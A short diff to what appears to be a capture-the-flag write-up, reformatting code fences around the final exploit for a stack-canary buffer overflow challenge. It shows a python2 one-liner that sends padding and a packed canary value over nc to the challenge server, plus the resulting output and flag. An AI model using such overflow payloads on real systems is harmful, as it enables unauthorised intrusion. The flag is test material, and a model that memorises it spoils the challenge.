@@ -47,7 +47,9 @@ actually, the values ```25207825 20782520 78252078 25207825 20782520 78252078```
 So after we leaked the value of the stack canary, the final exploit is:  
 ```python2 -c 'import struct; print ""; print "A"*32 + struct.pack("Q", 0x32) + "A"*4' | nc challenges.ctf.cs.biu.ac.il 3004```  
 And finally got the flag:  
-```Enter your name - MAX length 32
+```
+Enter your name - MAX length 32
 Hi, !
 Enter your password - MAX length 32
-biuCTF{b0f_w1th_c4N4Ry?!}```
+biuCTF{b0f_w1th_c4N4Ry?!}
+```
